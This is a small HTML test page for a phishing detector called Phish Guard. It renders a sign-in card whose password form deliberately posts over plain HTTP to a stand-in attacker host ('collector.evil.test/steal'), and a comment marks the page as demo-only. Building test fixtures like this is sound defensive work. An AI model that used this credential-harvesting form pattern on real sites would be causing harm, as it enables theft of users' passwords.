<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Account Sign In</title>
  <style>
    body { font: 16px system-ui, sans-serif; background: #f2f4f8; }
    .card { max-width: 360px; margin: 80px auto; background: #fff; padding: 28px;
            border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
    input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
    button { width: 100%; padding: 10px; background: #0b5; color: #fff; border: 0; border-radius: 6px; }
    h2 { margin-top: 0; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Sign in to continue</h2>
    <!-- DEMO ONLY: this password form posts to a DIFFERENT domain over plain
         HTTP on purpose — two high-risk signals Phish Guard should warn about.
         The endpoint is a non-routable example domain; nothing is sent. -->
    <form action="http://collector.evil.test/steal" method="post">
      <input type="email" placeholder="Email" />
      <input type="password" placeholder="Password" />
      <button type="submit">Sign in</button>
    </form>
    <p style="font-size:12px;color:#888">This is a safe local test page for Phish Guard.</p>
  </div>
</body>
</html>
